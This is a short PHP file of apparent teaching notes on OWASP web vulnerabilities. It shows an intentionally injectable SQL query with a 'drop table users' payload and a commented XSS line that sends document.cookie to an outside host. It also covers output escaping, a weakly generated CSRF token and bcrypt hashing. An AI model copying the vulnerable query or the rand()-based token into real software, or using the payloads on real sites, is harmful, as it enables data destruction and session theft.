<?php


/* ------------- No System is Safe ------------- */

// https://owasp.org/www-project-top-ten/


// 1. SQL Injection
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";

// get.php?id=1;drop table users

// 2. XSS - Cross Site Scripting

// <script>location.href='http://me.xyz?c='+document.cookie</script>

// echo htmlspecialchars($comment);

// 3. CSRF - Cross Site Request Forgery

// echo sha1(rand(1, 1000) . time());

session_start();

$token = sha1(rand(1, 1000) . 'csrf secret');
$_SESSION['csrf'] = $token;
?>

<a href="delete.php?id=1&csrf=<?= $token?>">Delete</a>

<!-- 4. Hashing -->
<?php
$password = "userpassword";
$hash = password_hash($password, PASSWORD_BCRYPT);

echo $hash;
?>